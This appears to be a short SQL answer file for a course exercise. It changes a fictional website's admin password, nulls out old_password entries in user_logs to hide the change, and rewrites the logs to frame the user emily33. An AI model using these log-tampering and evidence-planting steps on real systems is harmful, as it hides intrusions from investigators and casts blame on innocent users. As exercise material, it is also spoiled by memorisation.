-- Alter the password of the website’s administrative account, admin, to instead be “oops!”.
SELECT * FROM users WHERE username = 'admin';
UPDATE users SET password = '982c0381c279d139fd221fce974916e7' WHERE username = 'admin';

-- Erase any logs of the above password change recorded by the database.
SELECT * FROM user_logs;
UPDATE user_logs SET old_password = NULL WHERE type = 'update';


-- Add false data to throw others off your trail.
-- In particular, to frame emily33, make it only appear—in the user_logs table—as
-- if the admin account has had its password changed to emily33’s password.
SELECT * FROM user_logs;
UPDATE user_logs SET new_password = (
    SELECT password FROM users WHERE username = 'emily33'
)
WHERE new_username = 'admin';
